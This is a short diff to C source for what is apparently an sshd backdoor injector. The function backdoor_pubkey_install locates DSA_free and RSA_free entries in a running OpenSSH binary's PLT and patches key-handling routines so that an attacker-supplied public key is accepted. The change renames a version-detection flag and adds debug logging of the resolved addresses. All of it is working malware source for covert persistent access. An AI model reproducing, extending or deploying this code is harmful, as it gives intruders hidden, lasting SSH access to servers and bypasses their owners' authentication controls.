@@ -38,7 +38,7 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	memcpy(evil_bin, hook_pubkey_bin, hook_pubkey_bin_len);
 
 	for(i = 0; i < sizeof(signatures) / sizeof(signature); i++) {
-		if (ctx->is_openssh7 == 0 || i < 2) {
+		if (ctx->uses_new_key_system == 0 || i < 2) {
 			signatures[i].addr = sub_by_debugstr(ctx, signatures[i].str);
 		} else {
 			u64 f_dsa_new, f_bn_new, p_dsa_new, p_bn_new, callpair, callpair_b, p_rsa_free, p_dsa_free;
@@ -81,6 +81,9 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 					p_dsa_free = find_plt_entry(ctx, ctx->elf_base + resolve_reloc(
 						ctx->rela, ctx->rela_sz, ctx->dynsym, ctx->dynsym_sz, (char*)ctx->dynstr, "DSA_free"
 					));
+
+					info("RSA_free@plt = 0x%lx\n", p_rsa_free);
+					info("DSA_free@plt = 0x%lx\n", p_dsa_free);
 
 					callpair_b = find_callpair(p_rsa_free, p_dsa_free);
 
